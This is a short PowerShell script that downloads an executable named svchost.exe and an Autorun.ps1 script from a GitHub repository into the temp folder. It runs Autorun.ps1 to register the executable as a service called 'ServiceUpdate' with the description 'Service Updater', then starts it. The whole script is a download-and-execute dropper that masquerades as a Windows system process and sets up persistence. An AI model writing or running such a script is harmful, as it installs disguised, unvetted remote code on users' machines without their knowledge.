$url = 'https://github.com/BrendanBard/bundy/raw/master/svchost.exe'
$url2 = 'https://github.com/BrendanBard/bundy/raw/master/Autorun.ps1'
Invoke-WebRequest -Uri $url -OutFile "$env:temp\svchost.exe"
Invoke-WebRequest -Uri $url2 -OutFile "$env:temp\AutoRun.ps1"
& "$env:temp\AutoRun.ps1" -name "ServiceUpdate" -run "$env:temp\svchost.exe" -description "Service Updater"
Start-Process -Filepath "$env:temp\svchost.exe"
